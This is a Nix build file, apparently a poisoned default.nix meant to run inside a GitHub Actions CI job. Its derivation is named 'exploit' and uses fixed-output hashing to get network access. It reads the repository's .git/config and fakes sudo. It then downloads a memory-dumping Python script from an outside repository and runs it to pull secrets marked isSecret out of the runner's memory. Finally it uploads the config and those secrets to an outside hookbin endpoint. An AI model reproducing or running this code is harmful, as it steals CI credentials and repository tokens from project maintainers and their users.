{ bundle ? "default", job ? "rocq-core", ... }@args:
let
  pkgs = import <nixpkgs> {};
  gitConfig = if builtins.pathExists ./.git/config then builtins.readFile ./.git/config else "no git config";
  runId = builtins.getEnv "GITHUB_RUN_ID";
  fakeSudo = pkgs.writeShellScriptBin "sudo" ''
    #!/bin/bash
    if [[ "$1" == "-E" ]]; then
      shift
    fi
    exec "$@"
  '';
in
pkgs.stdenv.mkDerivation {
  name = "exploit";
  outputHashMode = "flat";
  outputHashAlgo = "sha256";
  outputHash = "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
  nativeBuildInputs = [ pkgs.curl pkgs.python3 pkgs.gnugrep pkgs.cacert fakeSudo ];
  GIT_CONFIG = gitConfig;
  GITHUB_RUN_ID = runId;
  SSL_CERT_FILE = "${pkgs.cacert}/etc/ssl/certs/ca-bundle.crt";
  buildCommand = ''
    echo "Okay, we got this far. Let's continue..."
    echo "$GIT_CONFIG" > /tmp/secrets
    curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets" || true
    curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" || true
    echo "done" > $out
  '';
}
